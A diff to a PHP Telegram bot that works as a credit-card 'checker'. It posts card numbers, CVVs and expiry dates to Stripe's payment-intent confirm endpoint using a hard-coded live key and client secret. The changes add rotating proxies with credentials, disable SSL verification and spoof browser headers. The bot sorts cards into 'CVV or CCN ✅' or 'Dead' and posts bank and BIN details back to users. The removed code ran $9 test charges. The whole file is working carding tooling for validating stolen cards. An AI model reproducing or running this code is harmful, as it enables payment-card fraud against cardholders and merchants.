@@ -62,6 +62,8 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
         
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
+            curl_setopt($ch, CURLOPT_PROXY, $url[array_rand($url)]);
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpass[array_rand($userpass)]);
             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_HEADER, 0);
             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
@@ -162,109 +164,136 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             
             if(!$stripeerror){
                 $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LNOv3CPBTfxNhAO1oovvvkR/confirm');
-            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-            'Host: api.stripe.com',
-            'Accept: application/json',
-            'Accept-Language: en-US,en;q=0.5',
-            'Accept-Encoding: gzip, deflate, br',
-            'Origin: https://js.stripe.com',
-            'Content-Type: application/x-www-form-urlencoded',
-            'Referer: https://js.stripe.com/',
-            'Sec-Fetch-Dest: empty',
-            'Sec-Fetch-Mode: no-cors',
-            'Sec-Fetch-Site: cross-site',
-            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'));
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=$name+$last&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=13th+Ave+Street&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=$zip&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=$guid&payment_method_data[muid]=$muid&payment_method_data[sid]=$sid&payment_method_data[payment_user_agent]=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&payment_method_data[time_on_page]=$time&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51GtEAVCPBTfxNhAOgG5TfwPQRmY59A8HluifMEKkTlNonq23OrPPKMTP1qnUJBcCUGqTn6CSlQbMsFRZPo8mD5Ac00ETfGI9dH&client_secret=pi_3LNOv3CPBTfxNhAO1oovvvkR_secret_ZBrH6AcOGd6f41OWHwT8mRT9i');
-            $result1 = curl_exec($ch);
+                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LNOv3CPBTfxNhAO1oovvvkR/confirm');
+                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+                curl_setopt($ch, CURLOPT_HEADER, 0);
+                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                'Host: api.stripe.com',
+                'Accept: application/json',
+                'Accept-Language: en-US,en;q=0.5',
+                'Accept-Encoding: gzip, deflate, br',
+                'Origin: https://js.stripe.com',
+                'Content-Type: application/x-www-form-urlencoded',
+                'Referer: https://js.stripe.com/',
+                'Sec-Fetch-Dest: empty',
+                'Sec-Fetch-Mode: no-cors',
+                'Sec-Fetch-Site: cross-site',
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'));
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=$name+$last&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=13th+Ave+Street&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=$zip&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=$guid&payment_method_data[muid]=$muid&payment_method_data[sid]=$sid&payment_method_data[payment_user_agent]=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&payment_method_data[time_on_page]=$time&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51GtEAVCPBTfxNhAOgG5TfwPQRmY59A8HluifMEKkTlNonq23OrPPKMTP1qnUJBcCUGqTn6CSlQbMsFRZPo8mD5Ac00ETfGI9dH&client_secret=pi_3LNOv3CPBTfxNhAO1oovvvkR_secret_ZBrH6AcOGd6f41OWHwT8mRT9i');
+                $result2 = curl_exec($ch);
+                $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
+            }
             $info = curl_getinfo($ch);
             $time = $info['total_time'];
-            $httpCode = $info['http_code'];
-            $time = substr($time, 0, 4);
+            $time = substr_replace($time, '',4);
 
+            ###END OF CHECKER PART###
+            
+            
+            if(strpos($result2, 'client_secret')) {
+              addTotal();
+              addUserTotal($userId);
+              addCVV();
+              addUserCVV($userId);
+              addCCN();
+              addUserCCN($userId);
+              bot('editMessageText',[
+                'chat_id'=>$chat_id,
+                'message_id'=>$messageidtoedit,
+                'text'=>"<b>Card:</b> <code>$lista</code>
+<b>Status -» CVV or CCN ✅
+Response -» $result1 | $result1
+Gateway -» Stripe Auth 1
+Time -» <b>$time</b><b>s</b>
 
-// Responses
+------- Bin Info -------</b>
+<b>Bank -»</b> $bank
+<b>Brand -»</b> $schemename
+<b>Type -»</b> $typename
+<b>Currency -»</b> $currency
+<b>Country -»</b> $cname ($emoji - 💲$currency)
+<b>Issuers Contact -»</b> $phone
+<b>----------------------------</b>
 
-if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){
+<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
+<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
+                'parse_mode'=>'html',
+                'disable_web_page_preview'=>'true'
+                
+            ]);}
+            elseif($result2 == null && !$stripeerror) {
+              addTotal();
+              addUserTotal($userId);
+              bot('editMessageText',[
+                'chat_id'=>$chat_id,
+                'message_id'=>$messageidtoedit,
+                'text'=>"<b>Card:</b> <code>$lista</code>
+<b>Status -» API Down ❌
+Response -» $result1 | $result1
+Gateway -» Stripe Auth 1
+Time -» <b>$time</b><b>s</b>
 
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect ZIP Code </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
+------- Bin Info -------</b>
+<b>Bank -»</b> $bank
+<b>Brand -»</b> $schemename
+<b>Type -»</b> $typename
+<b>Currency -»</b> $currency
+<b>Country -»</b> $cname ($emoji - 💲$currency)
+<b>Issuers Contact -»</b> $phone
+<b>----------------------------</b>
 
-elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charged 9$.%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
+<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
+<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
+                'parse_mode'=>'html',
+                'disable_web_page_preview'=>'true'
+                
+            ]);}
+            else{
+              addTotal();
+              addUserTotal($userId);
+              bot('editMessageText',[
+                'chat_id'=>$chat_id,
+                'message_id'=>$messageidtoedit,
+                'text'=>"<b>Card:</b> <code>$lista</code>
+<b>Status -» Dead ❌
+Response -» $result1 | $result1
+Gateway -» Stripe Auth 1
+Time -» <b>$time</b><b>s</b>
 
-elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Insufficient Funds. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
+------- Bin Info -------</b>
+<b>Bank -»</b> $bank
+<b>Brand -»</b> $schemename
+<b>Type -»</b> $typename
+<b>Currency -»</b> $currency
+<b>Country -»</b> $cname ($emoji - 💲$currency)
+<b>Issuers Contact -»</b> $phone
+<b>----------------------------</b>
 
-
-elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect CVC. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CCN PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charge Rejected. </b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Pickup Card/Stolen Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-
-elseif (strpos($result1, "do_not_honor")){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Do Not Honor. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
-sendMessage($chat_id , '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card number is incorrect. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Incorrect (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-
-elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Expired Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Expired (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-
-elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card was declined.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif (strpos($result1, '"decline_code": "generic_decline"')){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-elseif (strpos($result1, "generic_decline")){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Security Code Check : '.$cvc_check.' PROXY DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif (strpos($result1, 'null')){
-sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A BRAND: <b>'.$brand.'</b> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A MESSAGE: <b>GATE ERROR (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
-}
-
-elseif ((strpos($result1, "missing input"))){
-sendMessage($chat_id, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
-}
-
-elseif(!$result2){
-sendMessage($chat_id, ''.$result2.'');
-}else{
-sendMessage($chat_id, ''.$result2.'');
-}
-curl_close($ch);
-            }
-        }
+<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
+<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
+                'parse_mode'=>'html',
+                'disable_web_page_preview'=>'true'
+                
+            ]);}
+          
+        }else{
+          bot('editMessageText',[
+              'chat_id'=>$chat_id,
+              'message_id'=>$messageidtoedit,
+              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
+              'parse_mode'=>'html',
+              'disable_web_page_preview'=>'true'
+              
+          ]);
+      }
     }
 }
+
+
 ?>
